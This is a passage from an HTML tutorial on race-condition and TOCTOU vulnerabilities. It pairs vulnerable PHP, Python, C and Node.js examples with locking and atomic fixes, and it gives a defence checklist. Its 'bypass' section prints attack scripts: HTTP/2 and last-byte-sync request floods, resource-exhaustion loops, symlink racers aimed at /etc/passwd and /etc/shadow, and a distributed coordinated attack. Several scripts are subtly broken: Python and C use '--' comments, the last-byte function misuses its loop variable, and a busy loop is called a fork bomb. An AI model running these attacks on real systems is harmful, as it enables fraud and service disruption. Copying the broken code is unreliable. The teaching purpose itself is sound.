    <span class="code-keyword">int</span> fd = open(path, O_CREAT | O_EXCL | O_WRONLY, <span class="code-keyword">0600</span>);
    <span class="code-comment">// O_EXCL ensures file didn't exist - atomic check-and-create</span>
    <span class="code-keyword">if</span> (fd < <span class="code-keyword">0</span>) {
        perror(<span class="code-string">"File exists or creation failed"</span>);
        <span class="code-keyword">return</span>;
    }
    <span class="code-comment">// Safe to use - we created it atomically</span>
}</code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Database Race Condition in Coupon System</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Non-atomic check-then-update in SQL operations.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable PHP Code</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable coupon redemption</span>
<span class="code-keyword">function</span> <span class="code-function">redeemCoupon</span>(<span class="code-keyword">$userId</span>, <span class="code-keyword">$couponCode</span>) {
    <span class="code-keyword">$pdo</span> = <span class="code-keyword">new</span> <span class="code-function">PDO</span>(<span class="code-string">'mysql:host=localhost;dbname=shop'</span>, <span class="code-string">'user'</span>, <span class="code-string">'pass'</span>);
    
    <span class="code-comment">// TOCTOU: Check if coupon is available</span>
    <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM coupons WHERE code = ? AND used = 0"</span>);
    <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$couponCode</span>]);
    <span class="code-keyword">$coupon</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">fetch</span>();
    
    <span class="code-keyword">if</span> (!<span class="code-keyword">$coupon</span>) {
        <span class="code-keyword">return</span> <span class="code-string">"Coupon invalid or used"</span>;
    }
    
    <span class="code-comment">// RACE WINDOW: Another request passes check here!</span>
    
    <span class="code-comment">// Apply discount</span>
    <span class="code-function">applyDiscount</span>(<span class="code-keyword">$userId</span>, <span class="code-keyword">$coupon</span>[<span class="code-string">'discount'</span>]);
    
    <span class="code-comment">// Mark as used (too late if race occurred)</span>
    <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"UPDATE coupons SET used = 1 WHERE code = ?"</span>);
    <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$couponCode</span>]);
    
    <span class="code-keyword">return</span> <span class="code-string">"Coupon applied!"</span>;
}
<span class="code-comment">// Attacker sends 50 parallel requests with same coupon code</span>
<span class="code-comment">// All 50 pass the check before any UPDATE executes!</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Implementation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">function</span> <span class="code-function">redeemCouponSecure</span>(<span class="code-keyword">$userId</span>, <span class="code-keyword">$couponCode</span>) {
    <span class="code-keyword">$pdo</span> = <span class="code-keyword">new</span> <span class="code-function">PDO</span>(<span class="code-string">'mysql:host=localhost;dbname=shop'</span>, <span class="code-string">'user'</span>, <span class="code-string">'pass'</span>);
    
    <span class="code-keyword">try</span> {
        <span class="code-keyword">$pdo</span>-><span class="code-function">beginTransaction</span>();
        
        <span class="code-comment">// Method 1: SELECT FOR UPDATE (row-level locking)</span>
        <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"
            SELECT * FROM coupons 
            WHERE code = ? AND used = 0 
            FOR UPDATE
        "</span>);
        <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$couponCode</span>]);
        <span class="code-keyword">$coupon</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">fetch</span>();
        
        <span class="code-keyword">if</span> (!<span class="code-keyword">$coupon</span>) {
            <span class="code-keyword">$pdo</span>-><span class="code-function">rollBack</span>();
            <span class="code-keyword">return</span> <span class="code-string">"Coupon invalid or used"</span>;
        }
        
        <span class="code-comment">// Safe to update - row is locked</span>
        <span class="code-function">applyDiscount</span>(<span class="code-keyword">$userId</span>, <span class="code-keyword">$coupon</span>[<span class="code-string">'discount'</span>]);
        
        <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"UPDATE coupons SET used = 1 WHERE code = ?"</span>);
        <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$couponCode</span>]);
        
        <span class="code-keyword">$pdo</span>-><span class="code-function">commit</span>();
        <span class="code-keyword">return</span> <span class="code-string">"Coupon applied!"</span>;
        
    } <span class="code-keyword">catch</span> (Exception <span class="code-keyword">$e</span>) {
        <span class="code-keyword">$pdo</span>-><span class="code-function">rollBack</span>();
        <span class="code-keyword">return</span> <span class="code-string">"Error: "</span> . <span class="code-keyword">$e</span>-><span class="code-function">getMessage</span>();
    }
}

<span class="code-comment">// Method 2: Atomic UPDATE with affected rows check</span>
<span class="code-keyword">function</span> <span class="code-function">redeemCouponAtomic</span>(<span class="code-keyword">$userId</span>, <span class="code-keyword">$couponCode</span>) {
    <span class="code-keyword">$pdo</span> = <span class="code-keyword">new</span> <span class="code-function">PDO</span>(<span class="code-string">'mysql:host=localhost;dbname=shop'</span>, <span class="code-string">'user'</span>, <span class="code-string">'pass'</span>);
    
    <span class="code-comment">// Single atomic operation - no race window</span>
    <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"
        UPDATE coupons 
        SET used = 1, used_by = ?, used_at = NOW() 
        WHERE code = ? AND used = 0
    "</span>);
    <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$userId</span>, <span class="code-keyword">$couponCode</span>]);
    
    <span class="code-keyword">if</span> (<span class="code-keyword">$stmt</span>-><span class="code-function">rowCount</span>() === <span class="code-keyword">0</span>) {
        <span class="code-keyword">return</span> <span class="code-string">"Coupon invalid or already used"</span>;
    }
    
    <span class="code-comment">// Get discount amount for applied coupon</span>
    <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT discount FROM coupons WHERE code = ?"</span>);
    <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$couponCode</span>]);
    <span class="code-keyword">$coupon</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">fetch</span>();
    
    <span class="code-function">applyDiscount</span>(<span class="code-keyword">$userId</span>, <span class="code-keyword">$coupon</span>[<span class="code-string">'discount'</span>]);
    <span class="code-keyword">return</span> <span class="code-string">"Coupon applied!"</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python Thread-Safe Counter</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Unprotected shared state in multi-threaded environment.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Python Code</span></div>
          <pre><code><span class="code-keyword">import</span> threading

<span class="code-keyword">class</span> <span class="code-function">UnsafeBankAccount</span>:
    <span class="code-keyword">def</span> <span class="code-function">__init__</span>(self, initial_balance=<span class="code-keyword">1000</span>):
        self.balance = initial_balance
    
    <span class="code-keyword">def</span> <span class="code-function">withdraw</span>(self, amount):
        <span class="code-comment"># TOCTOU: Check balance</span>
        <span class="code-keyword">if</span> self.balance >= amount:
            <span class="code-comment"># RACE WINDOW: Another thread withdraws here!</span>
            <span class="code-comment"># Both threads see balance >= amount</span>
            self.balance -= amount  <span class="code-comment"># Can go negative!</span>
            <span class="code-keyword">return</span> <span class="code-keyword">True</span>
        <span class="code-keyword">return</span> <span class="code-keyword">False</span>

<span class="code-comment"># Exploit: Two threads withdraw 800 from balance 1000</span>
<span class="code-comment"># Both pass check, balance becomes -600!</span>

account = UnsafeBankAccount(<span class="code-keyword">1000</span>)

<span class="code-keyword">def</span> <span class="code-function">withdraw_thread</span>():
    <span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">100</span>):
        account.withdraw(<span class="code-keyword">800</span>)

t1 = threading.Thread(target=withdraw_thread)
t2 = threading.Thread(target=withdraw_thread)
t1.start(); t2.start()
t1.join(); t2.join()

<span class="code-function">print</span>(<span class="code-string">f"Final balance: {account.balance}"</span>)  <span class="code-comment"># Likely negative!</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Implementation</span></div>
          <pre><code><span class="code-keyword">import</span> threading

<span class="code-keyword">class</span> <span class="code-function">SafeBankAccount</span>:
    <span class="code-keyword">def</span> <span class="code-function">__init__</span>(self, initial_balance=<span class="code-keyword">1000</span>):
        self.balance = initial_balance
        self.lock = threading.Lock()  <span class="code-comment"># Mutex for critical section</span>
    
    <span class="code-keyword">def</span> <span class="code-function">withdraw</span>(self, amount):
        <span class="code-keyword">with</span> self.lock:  <span class="code-comment"># Acquire lock before check</span>
            <span class="code-comment"># Critical section: check and update are atomic</span>
            <span class="code-keyword">if</span> self.balance >= amount:
                self.balance -= amount
                <span class="code-keyword">return</span> <span class="code-keyword">True</span>
            <span class="code-keyword">return</span> <span class="code-keyword">False</span>

<span class="code-comment"># Alternative: Using atomic compare-and-swap</span>
<span class="code-keyword">import</span> queue

<span class="code-keyword">class</span> <span class="code-function">AtomicBankAccount</span>:
    <span class="code-keyword">def</span> <span class="code-function">__init__</span>(self, initial_balance=<span class="code-keyword">1000</span>):
        self.balance = initial_balance
        self.queue = queue.Queue()
        self.worker = threading.Thread(target=self._process)
        self.worker.start()
    
    <span class="code-keyword">def</span> <span class="code-function">_process</span>(self):
        <span class="code-comment"># Single-threaded event loop eliminates races</span>
        <span class="code-keyword">while</span> <span class="code-keyword">True</span>:
            task = self.queue.get()
            <span class="code-keyword">if</span> task <span class="code-keyword">is</span> <span class="code-keyword">None</span>: <span class="code-keyword">break</span>
            amount, result_queue = task
            success = self.balance >= amount
            <span class="code-keyword">if</span> success:
                self.balance -= amount
            result_queue.put(success)
    
    <span class="code-keyword">def</span> <span class="code-function">withdraw</span>(self, amount):
        result_q = queue.Queue()
        self.queue.put((amount, result_q))
        <span class="code-keyword">return</span> result_q.get()</code></pre>
        </div>

        <h3 class="subsection-title">Lab 4: JavaScript Async/Await Race</h3>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Node.js Code</span></div>
          <pre><code><span class="code-comment">// Vulnerable: Non-atomic async operations</span>
<span class="code-keyword">app.post</span>(<span class="code-string">'/transfer'</span>, <span class="code-keyword">async</span> (req, res) => {
    <span class="code-keyword">const</span> { fromAccount, toAccount, amount } = req.body;
    
    <span class="code-comment">// Read balance (async - yields control!)</span>
    <span class="code-keyword">const</span> fromBalance = <span class="code-keyword">await</span> db.getBalance(fromAccount);
    
    <span class="code-comment">// RACE WINDOW: Another request runs here!</span>
    <span class="code-comment">// Both requests read same balance</span>
    
    <span class="code-keyword">if</span> (fromBalance >= amount) {
        <span class="code-keyword">await</span> db.updateBalance(fromAccount, -amount);  <span class="code-comment">// Can overdraw!</span>
        <span class="code-keyword">await</span> db.updateBalance(toAccount, +amount);
        res.json({ success: <span class="code-keyword">true</span> });
    } <span class="code-keyword">else</span> {
        res.status(<span class="code-keyword">400</span>).json({ error: <span class="code-string">'Insufficient funds'</span> });
    }
});</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Node.js Implementation</span></div>
          <pre><code><span class="code-keyword">const</span> { Mutex } = <span class="code-function">require</span>(<span class="code-string">'async-mutex'</span>);
<span class="code-keyword">const</span> accountLocks = <span class="code-keyword">new</span> <span class="code-function">Map</span>();  <span class="code-comment">// Per-account locks</span>

<span class="code-keyword">function</span> <span class="code-function">getAccountLock</span>(accountId) {
    <span class="code-keyword">if</span> (!accountLocks.<span class="code-function">has</span>(accountId)) {
        accountLocks.<span class="code-function">set</span>(accountId, <span class="code-keyword">new</span> <span class="code-function">Mutex</span>());
    }
    <span class="code-keyword">return</span> accountLocks.<span class="code-function">get</span>(accountId);
}

<span class="code-keyword">app.post</span>(<span class="code-string">'/transfer'</span>, <span class="code-keyword">async</span> (req, res) => {
    <span class="code-keyword">const</span> { fromAccount, toAccount, amount } = req.body;
    
    <span class="code-comment">// Acquire locks for both accounts (ordered to prevent deadlock)</span>
    <span class="code-keyword">const</span> lock1 = fromAccount < toAccount ? fromAccount : toAccount;
    <span class="code-keyword">const</span> lock2 = fromAccount < toAccount ? toAccount : fromAccount;
    
    <span class="code-keyword">const</span> release1 = <span class="code-keyword">await</span> <span class="code-function">getAccountLock</span>(lock1).<span class="code-function">acquire</span>();
    <span class="code-keyword">const</span> release2 = <span class="code-keyword">await</span> <span class="code-function">getAccountLock</span>(lock2).<span class="code-function">acquire</span>();
    
    <span class="code-keyword">try</span> {
        <span class="code-comment">// Critical section: fully atomic</span>
        <span class="code-keyword">const</span> fromBalance = <span class="code-keyword">await</span> db.<span class="code-function">getBalance</span>(fromAccount);
        
        <span class="code-keyword">if</span> (fromBalance >= amount) {
            <span class="code-keyword">await</span> db.<span class="code-function">updateBalance</span>(fromAccount, -amount);
            <span class="code-keyword">await</span> db.<span class="code-function">updateBalance</span>(toAccount, +amount);
            res.json({ success: <span class="code-keyword">true</span> });
        } <span class="code-keyword">else</span> {
            res.status(<span class="code-keyword">400</span>).json({ error: <span class="code-string">'Insufficient funds'</span> });
        }
    } <span class="code-keyword">finally</span> {
        release2();
        release1();
    }
});

<span class="code-comment">// Alternative: Database-level atomic operation</span>
<span class="code-keyword">app.post</span>(<span class="code-string">'/transfer-atomic'</span>, <span class="code-keyword">async</span> (req, res) => {
    <span class="code-keyword">const</span> { fromAccount, toAccount, amount } = req.body;
    
    <span class="code-comment">// Single atomic UPDATE - no application-level race</span>
    <span class="code-keyword">const</span> result = <span class="code-keyword">await</span> db.<span class="code-function">query</span>(<span class="code-string">`
        UPDATE accounts 
        SET balance = balance - $1 
        WHERE id = $2 AND balance >= $1
        RETURNING balance
    `</span>, [amount, fromAccount]);
    
    <span class="code-keyword">if</span> (result.rows.length === <span class="code-keyword">0</span>) {
        <span class="code-keyword">return</span> res.status(<span class="code-keyword">400</span>).json({ error: <span class="code-string">'Insufficient funds'</span> });
    }
    
    <span class="code-keyword">await</span> db.<span class="code-function">query</span>(<span class="code-string">`
        UPDATE accounts SET balance = balance + $1 WHERE id = $2
    `</span>, [amount, toAccount]);
    
    res.json({ success: <span class="code-keyword">true</span>, newBalance: result.rows[<span class="code-keyword">0</span>].balance });
});</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> Race Condition Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ sophisticated techniques to exploit even well-defended systems. Understanding these advanced
          methods is crucial for building robust defenses.
        </p>

        <h3 class="subsection-title">1. HTTP/2 Single-Packet Attack</h3>
        <p class="text-content">
          HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, eliminating network jitter and
          ensuring true simultaneous arrival at the server.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">HTTP/2 Race Exploit</span></div>
          <pre><code><span class="code-comment">-- HTTP/2 frames in single packet:</span>
<span class="code-comment">-- HEADERS frame (Stream 1): POST /redeem</span>
<span class="code-comment">-- HEADERS frame (Stream 3): POST /redeem</span>
<span class="code-comment">-- HEADERS frame (Stream 5): POST /redeem</span>
<span class="code-comment">-- DATA frames for all streams</span>
<span class="code-comment">-- All processed by server simultaneously!</span>

<span class="code-comment">-- Using h2load for testing:</span>
h2load -n1000 -c100 -m100 <span class="code-string">"https://target.com/api/redeem"</span> \
       -H <span class="code-string">"Authorization: Bearer TOKEN"</span> \
       -d <span class="code-string">'{"coupon":"SAVE20"}'</span>

<span class="code-comment">-- -m100 = 100 concurrent streams per connection</span>
<span class="code-comment">-- All requests arrive in same network packet</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Last-Byte Synchronization</h3>
        <p class="text-content">
          For HTTP/1.1 targets, attackers can hold back the final byte of multiple requests, then send them
          simultaneously to synchronize arrival.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Last-Byte Sync Technique</span></div>
          <pre><code><span class="code-comment">-- Python implementation:</span>
<span class="code-keyword">import</span> socket

<span class="code-keyword">def</span> <span class="code-function">last_byte_sync_attack</span>(host, port, requests):
    sockets = []
    
    <span class="code-comment">-- Open connections and send all but last byte</span>
    <span class="code-keyword">for</span> req <span class="code-keyword">in</span> requests:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.<span class="code-function">connect</span>((host, port))
        s.<span class="code-function">sendall</span>(req[:-<span class="code-keyword">1</span>])  <span class="code-comment">-- All except last byte</span>
        sockets.append(s)
    
    <span class="code-comment">-- Synchronize and send final bytes simultaneously</span>
    <span class="code-keyword">for</span> s <span class="code-keyword">in</span> sockets:
        s.<span class="code-function">sendall</span>(req[-<span class="code-keyword">1</span>:])  <span class="code-comment">-- Last byte</span>
    
    <span class="code-comment">-- Read responses</span>
    responses = [s.<span class="code-function">recv</span>(<span class="code-keyword">4096</span>) <span class="code-keyword">for</span> s <span class="code-keyword">in</span> sockets]
    <span class="code-keyword">return</span> responses</code></pre>
        </div>

        <h3 class="subsection-title">3. Resource Exhaustion Widening</h3>
        <p class="text-content">
          Attackers can deliberately slow down the target system to widen the race window, increasing the probability of
          successful exploitation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Window Widening Techniques</span></div>
          <pre><code><span class="code-comment">-- CPU exhaustion</span>
<span class="code-keyword">while</span> :; <span class="code-keyword">do</span> :; <span class="code-keyword">done</span> &  <span class="code-comment">-- Fork bomb variant</span>

<span class="code-comment">-- Memory pressure</span>
python3 -c <span class="code-string">"a = 'x' * (1024**3)"</span>  <span class="code-comment">-- Allocate 1GB</span>

<span class="code-comment">-- Disk I/O saturation</span>
<span class="code-keyword">while</span> <span class="code-keyword">true</span>; <span class="code-keyword">do</span>
    dd <span class="code-keyword">if</span>=/dev/zero of=/tmp/fill bs=1M count=1000
<span class="code-keyword">done</span>

<span class="code-comment">-- Network latency injection (local)</span>
tc qdisc add dev eth0 root netem delay 100ms  <span class="code-comment">-- Add 100ms latency</span>

<span class="code-comment">-- Database connection pool exhaustion</span>
<span class="code-keyword">for</span> i <span class="code-keyword">in</span> {1..1000}; <span class="code-keyword">do</span>
    curl <span class="code-string">"https://target.com/slow-query"</span> &
<span class="code-keyword">done</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Symlink Brute Forcing</h3>
        <p class="text-content">
          For file-based TOCTOU, attackers rapidly switch symlinks between benign and malicious targets, hoping to hit
          the exact race window.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Symlink Race Exploit</span></div>
          <pre><code><span class="code-comment">-- C symlink racer:</span>
<span class="code-keyword">#include</span> <span class="code-string">&lt;unistd.h&gt;</span>

<span class="code-keyword">int</span> <span class="code-function">main</span>() {
    <span class="code-keyword">while</span> (<span class="code-keyword">1</span>) {
        unlink(<span class="code-string">"/tmp/race_target"</span>);
        symlink(<span class="code-string">"/tmp/benign_file"</span>, <span class="code-string">"/tmp/race_target"</span>);
        unlink(<span class="code-string">"/tmp/race_target"</span>);
        symlink(<span class="code-string">"/etc/passwd"</span>, <span class="code-string">"/tmp/race_target"</span>);
    }
    <span class="code-keyword">return</span> <span class="code-keyword">0</span>;
}

<span class="code-comment">-- Python implementation:</span>
<span class="code-keyword">import</span> os
<span class="code-keyword">import</span> threading

<span class="code-keyword">def</span> <span class="code-function">symlink_racer</span>():
    target = <span class="code-string">"/tmp/victim_file"</span>
    benign = <span class="code-string">"/tmp/benign"</span>
    malicious = <span class="code-string">"/etc/shadow"</span>
    
    <span class="code-keyword">while</span> <span class="code-keyword">True</span>:
        <span class="code-keyword">try</span>:
            os.<span class="code-function">unlink</span>(target)
        <span class="code-keyword">except</span>: <span class="code-keyword">pass</span>
        os.<span class="code-function">symlink</span>(benign, target)
        
        <span class="code-keyword">try</span>:
            os.<span class="code-function">unlink</span>(target)
        <span class="code-keyword">except</span>: <span class="code-keyword">pass</span>
        os.<span class="code-function">symlink</span>(malicious, target)

<span class="code-comment">-- Run multiple threads for higher success rate</span>
<span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">10</span>):
    threading.Thread(target=symlink_racer).start()</code></pre>
        </div>

        <h3 class="subsection-title">5. Distributed Race Attacks</h3>
        <p class="text-content">
          Using multiple machines or cloud instances to increase request volume and synchronization precision.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Distributed Race Setup</span></div>
          <pre><code><span class="code-comment">-- Coordinator script (master node):</span>
<span class="code-keyword">import</span> socket
<span class="code-keyword">import</span> time

<span class="code-keyword">def</span> <span class="code-function">coordinate_attack</span>(nodes, target_time):
    <span class="code-comment">-- Synchronize clocks with NTP first</span>
    <span class="code-comment">-- Send GO signal at exact microsecond</span>
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    <span class="code-keyword">while</span> time.time_ns() < target_time:
        <span class="code-keyword">pass</span>  <span class="code-comment">-- Busy wait for precision</span>
    
    <span class="code-keyword">for</span> node <span class="code-keyword">in</span> nodes:
        sock.sendto(<span class="code-string">b'ATTACK'</span>, (node, <span class="code-keyword">9999</span>))

<span class="code-comment">-- Worker script (each node):</span>
<span class="code-keyword">import</span> socket
<span class="code-keyword">import</span> requests

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((<span class="code-string">'0.0.0.0'</span>, <span class="code-keyword">9999</span>))
sock.<span class="code-function">recvfrom</span>(<span class="code-keyword">1024</span>)  <span class="code-comment">-- Wait for GO signal</span>

<span class="code-comment">-- Fire 100 requests simultaneously</span>
<span class="code-keyword">import</span> threading
<span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">100</span>):
    threading.Thread(target=
        <span class="code-keyword">lambda</span>: requests.post(<span class="code-string">"https://target.com/api/action"</span>)
    ).start()</code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> Race Condition Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never separate security checks from the operations they protect. Make critical
          sections atomic using database transactions, locks, or atomic operations. Assume concurrent execution at all
          times and design your architecture to be inherently thread-safe.
        </div>

        <h3 class="subsection-title">Layer 1: Atomic Operations</h3>
        <p class="text-content">
          The most effective defense is eliminating the race window entirely by combining check and use into a single
          atomic operation.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Atomic Operation Patterns</span></div>
          <pre><code><span class="code-comment">-- SQL: Use UPDATE with WHERE clause (atomic)</span>
<span class="code-keyword">UPDATE</span> coupons 
<span class="code-keyword">SET</span> used = <span class="code-keyword">1</span>, used_by = <span class="code-string">'user_123'</span> 
<span class="code-keyword">WHERE</span> code = <span class="code-string">'SAVE20'</span> <span class="code-keyword">AND</span> used = <span class="code-keyword">0</span>;

<span class="code-comment">-- Check affected rows: if 0, someone else won the race</span>

<span class="code-comment">-- Redis: Use Lua scripts for atomicity</span>
<span class="code-keyword">local</span> balance = redis.<span class="code-function">call</span>(<span class="code-string">'GET'</span>, KEYS[<span class="code-keyword">1</span>])
<span class="code-keyword">if</span> <span class="code-function">tonumber</span>(balance) >= <span class="code-function">tonumber</span>(ARGV[<span class="code-keyword">1</span>]) <span class="code-keyword">then</span>
    redis.<span class="code-function">call</span>(<span class="code-string">'DECRBY'</span>, KEYS[<span class="code-keyword">1</span>], ARGV[<span class="code-keyword">1</span>])
    <span class="code-keyword">return</span> <span class="code-keyword">1</span>
<span class="code-keyword">else</span>
    <span class="code-keyword">return</span> <span class="code-keyword">0</span>
<span class="code-keyword">end</span>

<span class="code-comment">-- MongoDB: findAndModify (atomic)</span>
db.coupons.<span class="code-function">findAndModify</span>({
    query: { code: <span class="code-string">'SAVE20'</span>, used: <span class="code-keyword">false</span> },
    update: { $set: { used: <span class="code-keyword">true</span>, usedBy: <span class="code-string">'user_123'</span> } }
})

<span class="code-comment">-- DynamoDB: Conditional writes</span>
<span class="code-keyword">const</span> params = {
    TableName: <span class="code-string">'Coupons'</span>,
    Key: { code: <span class="code-string">'SAVE20'</span> },
    UpdateExpression: <span class="code-string">'SET used = :true, usedBy = :user'</span>,
    ConditionExpression: <span class="code-string">'attribute_not_exists(used) OR used = :false'</span>,
    ExpressionAttributeValues: {
        <span class="code-string">':true'</span>: <span class="code-keyword">true</span>,
        <span class="code-string">':false'</span>: <span class="code-keyword">false</span>,
        <span class="code-string">':user'</span>: <span class="code-string">'user_123'</span>
    }
};</code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Pessimistic Locking</h3>
        <p class="text-content">
          When atomic operations aren't possible, use explicit locks to serialize access to shared resources.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Locking Strategies</span></div>
          <pre><code><span class="code-comment">-- Database row-level locking (SELECT FOR UPDATE)</span>
<span class="code-keyword">BEGIN</span>;
<span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> accounts 
<span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span> 
<span class="code-keyword">FOR UPDATE</span>;  <span class="code-comment">-- Locks row until transaction commits</span>

<span class="code-comment">-- Now safe to check and update</span>
<span class="code-keyword">UPDATE</span> accounts <span class="code-keyword">SET</span> balance = balance - <span class="code-keyword">100</span> 
<span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span>;
<span class="code-keyword">COMMIT</span>;

<span class="code-comment">-- Distributed locking with Redis Redlock</span>
<span class="code-keyword">const</span> Redlock = <span class="code-function">require</span>(<span class="code-string">'redlock'</span>);
<span class="code-keyword">const</span> redlock = <span class="code-keyword">new</span> <span class="code-function">Redlock</span>([redis1, redis2, redis3]);

<span class="code-keyword">const</span> lock = <span class="code-keyword">await</span> redlock.<span class="code-function">lock</span>(<span class="code-string">'locks:account:user_123'</span>, <span class="code-keyword">1000</span>);
<span class="code-keyword">try</span> {
    <span class="code-comment">// Critical section</span>
    <span class="code-keyword">await</span> processTransfer();
} <span class="code-keyword">finally</span> {
    <span class="code-keyword">await</span> lock.<span class="code-function">unlock</span>();
}

<span class="code-comment">-- Advisory locks in PostgreSQL</span>
<span class="code-keyword">SELECT</span> pg_advisory_lock(id) <span class="code-keyword">FROM</span> accounts <span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span>;
<span class="code-comment">-- ... critical section ...</span>
<span class="code-keyword">SELECT</span> pg_advisory_unlock(id) <span class="code-keyword">FROM</span> accounts <span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span>;</code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Optimistic Locking</h3>
        <p class="text-content">
          For high-contention scenarios, optimistic locking detects conflicts rather than preventing them, retrying when
          collisions occur.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Optimistic Concurrency Control</span></div>
          <pre><code><span class="code-comment">-- Version-based optimistic locking</span>
<span class="code-keyword">CREATE TABLE</span> accounts (
    id <span class="code-keyword">VARCHAR</span>(<span class="code-keyword">255</span>) <span class="code-keyword">PRIMARY KEY</span>,
    balance <span class="code-keyword">DECIMAL</span>(<span class="code-keyword">10</span>,<span class="code-keyword">2</span>),
    version <span class="code-keyword">INT DEFAULT</span> <span class="code-keyword">0</span>
);

<span class="code-comment">-- Read balance and version</span>
<span class="code-keyword">SELECT</span> balance, version <span class="code-keyword">FROM</span> accounts <span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span>;
<span class="code-comment">-- Returns: balance=1000, version=5</span>

<span class="code-comment">-- Update with version check</span>
<span class="code-keyword">UPDATE</span> accounts 
<span class="code-keyword">SET</span> balance = <span class="code-keyword">900</span>, version = <span class="code-keyword">6</span> 
<span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span> <span class="code-keyword">AND</span> version = <span class="code-keyword">5</span>;

<span class="code-comment">-- If affected_rows = 0, another transaction updated first</span>
<span class="code-comment">-- Retry with new version read</span>

<span class="code-comment">-- Python implementation with retry</span>
<span class="code-keyword">def</span> <span class="code-function">update_with_retry</span>(account_id, amount, max_retries=<span class="code-keyword">3</span>):
    <span class="code-keyword">for</span> attempt <span class="code-keyword">in</span> <span class="code-function">range</span>(max_retries):
        account = db.accounts.<span class="code-function">find_one</span>({<span class="code-string">'_id'</span>: account_id})
        
        result = db.accounts.<span class="code-function">update_one</span>(
            {<span class="code-string">'_id'</span>: account_id, <span class="code-string">'_version'</span>: account[<span class="code-string">'_version'</span>]},
            {<span class="code-string">'$set'</span>: {<span class="code-string">'balance'</span>: account[<span class="code-string">'balance'</span>] - amount},
             <span class="code-string">'$inc'</span>: {<span class="code-string">'_version'</span>: <span class="code-keyword">1</span>}}
        )
        
        <span class="code-keyword">if</span> result.modified_count == <span class="code-keyword">1</span>:
            <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    
    <span class="code-keyword">raise</span> <span class="code-function">ConcurrencyError</span>(<span class="code-string">"Max retries exceeded"</span>)</code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: File System Defenses</h3>
        <p class="text-content">
          For file-based TOCTOU, use file descriptor-based operations and atomic file creation patterns.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure File Operations</span></div>
          <pre><code><span class="code-comment">-- Linux: Use /dev/shm for temporary files (no disk I/O race)</span>
